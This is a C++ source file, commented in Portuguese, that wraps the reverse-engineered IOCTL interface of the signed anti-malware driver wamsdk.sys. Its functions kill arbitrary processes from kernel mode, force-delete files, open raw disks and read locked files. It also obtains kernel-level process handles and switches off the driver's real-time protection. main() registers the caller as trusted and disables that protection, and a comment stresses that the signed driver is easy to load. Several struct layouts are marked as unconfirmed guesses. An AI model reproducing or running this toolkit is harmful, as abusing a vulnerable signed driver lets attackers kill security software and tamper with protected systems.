// Driver SHA256: 5AF1DAE21425DDA8311A2044209C308525135E1733EEFF5DD20649946C6E054C
// Driver SHA1: 96F0DBF52AED0AFD43E44500116B04B674F7358E
// Driver MD5: B6B51508AD6F462C45FE102C85D246C8
// Versão: 1.1.100
// Nome Original: wamsdk.sys

#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

// Mapeamento dos IOCTLs do driver wamsdk.sys
#define ZAM_TYPE 0x8000

#define IOCTL_ZAM_REGISTER_PROCESS      0x80002010 // Whitelist de processo para o driver
#define IOCTL_ZAM_GET_IMAGE_SIG         0x80002018 // Assinatura de imagem PE
#define IOCTL_ZAM_OPEN_PHYSICAL_DRIVE   0x8000201C // Acesso raw ao disco
#define IOCTL_ZAM_DELETE_FILE           0x8000202C // Delete forçado de arquivos
#define IOCTL_ZAM_ENUM_MODULES          0x80002034 // Enumeração de DLLs
#define IOCTL_ZAM_ENUM_PROCESSES        0x80002030 // Listagem de processos via Kernel
#define IOCTL_ZAM_TERMINATE_PROCESS     0x80002044 // Kill process
#define IOCTL_ZAM_OPEN_PROCESS          0x8000204C // Acesso a processos via Kernel
#define IOCTL_ZAM_OPEN_THREAD           0x80002084 // Handle de Thread via Kernel
#define IOCTL_ZAM_ENABLE_RT             0x8000208C // Liga proteção Real-Time do driver
#define IOCTL_ZAM_DISABLE_RT            0x80002090 // Desliga proteção Real-Time do driver
#define IOCTL_ZAM_GET_RT_STATUS         0x80002094 // Consulta status da proteção Real-Time do driver
#define IOCTL_ZAM_CREATE_FILE_BYPASS    0x80002004 // Leitura de arquivos "travados"
#define IOCTL_ZAM_CHECK_DISPATCH        0x80002008 // Checa hooks em functions de outros drivers
#define IOCTL_ZAM_FIX_DISPATCH          0x8000200C // Restaura functions originais
#define IOCTL_ZAM_GET_KERNEL_INFO       0x80002020 // Lista drivers e módulos do Kernel
#define IOCTL_ZAM_FIX_CRITICAL_FUNCS    0x80002028 // Limpa hooks de funções vitais do Windows
#define IOCTL_ZAM_BLOCK_UNSAFE_DLLS     0x80002050 // Bloqueia DLLs não assinadas/suspeitas
#define IOCTL_ZAM_GET_DRIVER_PROTOCOL   0x80002054 // Verifica versão da API do driver

// Estruturas de requisição para os IOCTLs (preciso melhorar muita coisa ainda)
#pragma pack(push, 1)

struct ZAM_KERNEL_MODULE_INFO {
    PVOID SectionAddress;
    char FullPath[256];
};

struct ZAM_MODULE_INFO {
    PVOID BaseAddress;
    ULONG ModuleSize;
    WCHAR ModulePath[256];
};

struct ZAM_INDEX_ENTRY {
    DWORD ProcessId;
    DWORD NameOffset;
};

struct ZAM_MODULE_ENTRY {
	// De acordo com alguns dumps que realizei aqui mesmo no .exe (em hex, no terminal), o driver parece usar um formato fixo de 528 bytes
    // Mas ainda assim só mostra a primeira entry,
    WCHAR ModulePath[256]; // 512 bytes
    PVOID BaseAddress;     // 8 bytes
    ULONG ModuleSize;      // 4 bytes
    BYTE Padding[4];       // Alinhamento para fechar em 528 ou similar
	// Talvez nesse padding exista mais alguma informação, mas preciso confirmar isso no IDA ainda
};
#pragma pack(pop)

struct ZAM_DRIVER_TARGET_REQ {
    WCHAR DriverName[256]; // Ex: L"\\Driver\\ntfs"
};

struct ZAM_CHECK_DRIVER_REQ {
    WCHAR DriverName[256]; // Ex: L"\\Driver\\ntfs"
};

struct ZAM_DISPATCH_REPORT {
    DWORD MajorIndex;     // IRP_MJ_CREATE, IRP_MJ_READ, etc.
    PVOID CurrentAddress; //
    PVOID OriginalAddress;//
    bool IsHooked;
};

struct ZAM_CREATE_FILE_REQ {
    ACCESS_MASK DesiredAccess;
    WCHAR FilePath[512];
};

struct ZAM_TERMINATE_REQ {
    DWORD ProcessId;
    DWORD ExitCode;
};

struct ZAM_DELETE_REQ {
    DWORD Options;
    WCHAR Path[512];
};

class WamSdk {
    HANDLE hDev;

public:
    WamSdk() : hDev(INVALID_HANDLE_VALUE) {}
    ~WamSdk() { Close(); }

	// Conecta com o driver wamsdk.sys e obtém a handle para comunicação via DeviceIoControl
    bool Connect() {
        hDev = CreateFileW(L"\\\\.\\amsdk", GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        return hDev != INVALID_HANDLE_VALUE;
    }

	// Fecha a handle do driver ao finalizar
    void Close() { if (hDev != INVALID_HANDLE_VALUE) CloseHandle(hDev); }

    // Funções do Driver:
	// 0x80002054 - Verifica versão da API do driver
    DWORD GetDriverProtocol() {
        DWORD protocolVersion = 0;
        DWORD bRet = 0;

        // O driver escreve a versão (0x2BC) diretamente no buffer de saída
        if (DeviceIoControl(hDev, IOCTL_ZAM_GET_DRIVER_PROTOCOL,
            NULL, 0,
            &protocolVersion, sizeof(DWORD),
            &bRet, NULL)) {
            return protocolVersion;
        }
        return 0;
    }

	// 0x80002050 - Bloqueia DLLs não assinadas/suspeitas
    bool SetBlockUnsafeDlls(bool enable) {
        DWORD mode = enable ? 1 : 0;
        DWORD bRet = 0;

        // É enviado apenas DWORD (4 bytes) com a flag
        bool success = DeviceIoControl(hDev, IOCTL_ZAM_BLOCK_UNSAFE_DLLS,
            &mode, sizeof(DWORD),
            NULL, 0, &bRet, NULL);

        if (success) {
            printf("Filtro de DLLs inseguras %s.\n", enable ? "ATIVADO" : "DESATIVADO");
        }
        else {
            printf("Falha ao configurar filtro de DLLs. Erro: %d\n", GetLastError());
        }
        return success;
    }

	// 0x80002028 - Limpa hooks de funções do Windows
    bool FixCriticalKernelFunctions() {
        DWORD bRet = 0;
		// O driver usa seus próprios dados internos, então o buffer de entrada pode ser nulo ou um comando de ativação (preciso confirmar isso ainda...)
        bool success = DeviceIoControl(hDev, IOCTL_ZAM_FIX_CRITICAL_FUNCS,
            NULL, 0,
            NULL, 0, &bRet, NULL);

        if (success) {
            printf("Hooks em funcoes criticas removidas\n");
        }
        else {
            printf("Falha ao restaurar funcoes criticas. Erro: %d\n", GetLastError());
        }
        return success;
    }

    // TODO: validar no IDA se REALMENTE o driver retorna somente o ntoskrn.exe
	// 0x80002020 - Lista drivers e módulos do Kernel
    void ListKernelModules() {
        const size_t bSize = 1024 * 128;
        std::vector<BYTE> buffer(bSize, 0);
        DWORD bRet = 0;

        if (DeviceIoControl(hDev, IOCTL_ZAM_GET_KERNEL_INFO,
            NULL, 0,
            buffer.data(), (DWORD)buffer.size(),
            &bRet, NULL)) {

            ZAM_KERNEL_MODULE_INFO* modules = (ZAM_KERNEL_MODULE_INFO*)buffer.data();
            int count = bRet / sizeof(ZAM_KERNEL_MODULE_INFO);

            for (int i = 0; i < count; i++) {
                if (modules[i].SectionAddress != NULL) {
                    // Usando %s para ANSI string
                    printf("Base: 0x%p | Path: %s\n",
                        modules[i].SectionAddress, modules[i].FullPath);
                }
            }
        }
    }

	// 0x8000200C - Anti-Hook: Restaura as rotinas de dispatch (chamada) originais de um driver alvo
    bool FixDriverHooks(std::wstring driverName) {
        ZAM_DRIVER_TARGET_REQ req = { 0 };

		// Copia o nome do driver (ex: L"\\Driver\\disk") para a estrutura de requisição
        wcscpy_s(req.DriverName, driverName.c_str());

        DWORD bRet = 0;
        // Enviamos a estrutura preenchida para o IOCTL 0x8000200C
        bool success = DeviceIoControl(hDev, IOCTL_ZAM_FIX_DISPATCH,
            &req, sizeof(req),
            NULL, 0, &bRet, NULL);

        if (success) {
            printf("Rotinas de Dispatch do driver %ls restauradas!\n", driverName.c_str());
        }
        else {
            printf("Falha ao restaurar driver %ls. Erro: %d\n", driverName.c_str(), GetLastError());
        }

        return success;
    }

    // 0x80002010 - Registro de processos como "seguros" para o driver
    bool RegisterSelf() {
        DWORD myPid = GetCurrentProcessId(); // Envie o PID real, não um dummy
        DWORD bytesRet = 0;
        return DeviceIoControl(hDev, IOCTL_ZAM_REGISTER_PROCESS,
            &myPid, sizeof(DWORD),
            NULL, 0, &bytesRet, NULL);
    }

	// 0x8000208C/0x80002090 - Proteção em tempo real do driver
    bool SetRealTimeProtection(bool enable) {
        DWORD b;
        return DeviceIoControl(hDev, enable ? IOCTL_ZAM_ENABLE_RT : IOCTL_ZAM_DISABLE_RT, NULL, 0, NULL, 0, &b, NULL);
    }

	// 0x8000204C - Acesso a processos
    HANDLE GetProcessHandle(DWORD pid) {
        DWORD hOut = 0, b = 0;
        if (DeviceIoControl(hDev, IOCTL_ZAM_OPEN_PROCESS, &pid, sizeof(DWORD), &hOut, sizeof(DWORD), &b, NULL))
            return (HANDLE)(ULONG_PTR)hOut;
        return NULL;
    }

	// 0x80002044 - Kill process por PID
    bool KillProcess(DWORD pid) {
        ZAM_TERMINATE_REQ req = { pid, 0 };
        DWORD b;
        return DeviceIoControl(hDev, IOCTL_ZAM_TERMINATE_PROCESS, &req, sizeof(req), NULL, 0, &b, NULL);
    }

	// 0x80002008 - Checagem de hooks em funções de drivers
    void CheckDriverHooks(std::wstring driverName) {
        ZAM_CHECK_DRIVER_REQ req = { 0 };
        wcscpy_s(req.DriverName, driverName.c_str());

        std::vector<ZAM_DISPATCH_REPORT> report(28); // Geralmante 28 MajorFunctions
        DWORD bRet = 0;

        printf("Verificando hooks no driver: %ls\n", driverName.c_str());

        if (DeviceIoControl(hDev, IOCTL_ZAM_CHECK_DISPATCH,
            &req, sizeof(req),
            report.data(), (DWORD)(sizeof(ZAM_DISPATCH_REPORT) * report.size()),
            &bRet, NULL)) {

            int count = bRet / sizeof(ZAM_DISPATCH_REPORT);
            for (int i = 0; i < count; i++) {
                if (report[i].IsHooked) {
                    printf("Hook detectado: Index[%d] | Endereço: 0x%p\n",
                        report[i].MajorIndex, report[i].CurrentAddress);
                }
            }
        }
        else {
            printf("Falha ao checar driver. Erro: %d\n", GetLastError());
        }
    }

    // 0x80002030 - Enumeração de processos
    void ListProcesses() {
        const size_t bSize = 1024 * 10; // 10KB
        std::vector<BYTE> buffer(bSize, 0);
        DWORD bytesRet = 0;

        // Informa o driver o tamanho disponível no início do buffer
        *(DWORD*)buffer.data() = (DWORD)(bSize / 4);

        if (DeviceIoControl(hDev, IOCTL_ZAM_ENUM_PROCESSES,
            buffer.data(), (DWORD)buffer.size(),
            buffer.data(), (DWORD)buffer.size(),
            &bytesRet, NULL)) {

            // O dispatcher escreve o contador no offset 0
            // E a lista de PIDs começa no offset 4 (MasterIrp + 2 wint_t)
            DWORD count = *(DWORD*)buffer.data();
            DWORD* pids = (DWORD*)(buffer.data() + 4);

            printf("%d processos encontrados no Kernel\n", count);

            for (DWORD i = 0; i < count; i++) {
                if (pids[i] > 0) {
                    printf("PID: %d\n", pids[i]);
                }
            }
        }
    }

	// 0x80002004 - Acesso a arquivos "travados"
    HANDLE CreateFileBypass(std::wstring path, ACCESS_MASK access = GENERIC_READ) {
        ZAM_CREATE_FILE_REQ req = { 0 };
        req.DesiredAccess = access;
        wcscpy_s(req.FilePath, path.c_str());

        HANDLE hOut = NULL;
        DWORD bRet = 0;

        // Retorna o Handle no buffer de saída (OutputBuffer)
        if (DeviceIoControl(hDev, IOCTL_ZAM_CREATE_FILE_BYPASS,
            &req, sizeof(req),
            &hOut, sizeof(HANDLE),
            &bRet, NULL)) {
            return hOut;
        }
        return NULL;
    }

	// 0x8000202C - Delete forçado de arquivos
    bool ForceDelete(std::wstring path) {
        ZAM_DELETE_REQ req = { 0 };
        wcscpy_s(req.Path, path.c_str());
        DWORD b;
        return DeviceIoControl(hDev, IOCTL_ZAM_DELETE_FILE, &req, sizeof(req), NULL, 0, &b, NULL);
    }

	// 0x8000201C - Acesso raw ao disco
    HANDLE OpenDisk(DWORD index) {
        DWORD hOut = 0, b = 0;
        if (DeviceIoControl(hDev, IOCTL_ZAM_OPEN_PHYSICAL_DRIVE, &index, sizeof(DWORD), &hOut, sizeof(DWORD), &b, NULL))
            return (HANDLE)(ULONG_PTR)hOut;
        return NULL;
    }

	// TODO: validar no IDA o formato exato do buffer de resposta do driver para esse IOCTL, e ajustar a leitura conforme necessário
    // 0x80002034 - Enumeração de DLLs de um processo
    void ListProcessModules(DWORD pid) {
		const size_t bSize = 1024 * 1024; // 1MB
        std::vector<BYTE> buffer(bSize, 0);
        DWORD bRet = 0;

        *(DWORD*)(buffer.data()) = pid;
        *(DWORD*)(buffer.data() + 4) = (DWORD)bSize;

        if (DeviceIoControl(hDev, IOCTL_ZAM_ENUM_MODULES,
            buffer.data(), (DWORD)bSize,
            buffer.data(), (DWORD)bSize,
            &bRet, NULL)) {

            printf("\nModulos do PID %d (%d bytes retornados)\n", pid, bRet);

            BYTE* current = buffer.data() + 4;
            int count = 0;

            while (current + 520 <= buffer.data() + bRet) {
				// Lê o caminho do módulo a partir do offset 4 da entrada atual
				// TODO: esse achismo é baseada em dumps que fiz, mas preciso confirmar no IDA o formato exato do buffer de resposta do driver para esse IOCTL
                WCHAR* path = (WCHAR*)(current + 4);

                if (path[0] != L'\0' && (path[1] == L':' || path[0] == L'\\')) {
                    wprintf(L"[%d] Path: %s\n", count++, path);

                    UINT64* basePtr = (UINT64*)(current + 520);
                    if (*basePtr > 0x10000) {
                        printf("    -> Base: 0x%llX\n", *basePtr);
                    }
                }

				// Avança para a próxima entry. O driver parece usar um formato fixo de 528 bytes por módulo (na real não tenho certeza ainda)
                current += 528;

                if (count > 500) break;
            }
        }
        else {
            printf("[-] Erro: %d\n", GetLastError());
        }
    }
};

int main() {

    WamSdk driver;

	// Conecta com a handle do driver wamsdk.sys
	// Certifique-se de que o driver esteja carregado
    // Não é muito difícil já que esse driver tem assinatura WHCA
    if (!driver.Connect()) {
        printf("Nao foi possivel carregar o driver.\n");
        return 1;
    }

	// "Inits" do driver: registro do próprio PID e disable da proteção em tempo real do driver
    driver.RegisterSelf();
    driver.SetRealTimeProtection(false);

	// A partir daqui, você pode criar as funções para interagir com o driver conforme necessário.

	system("pause");

    return 0;
}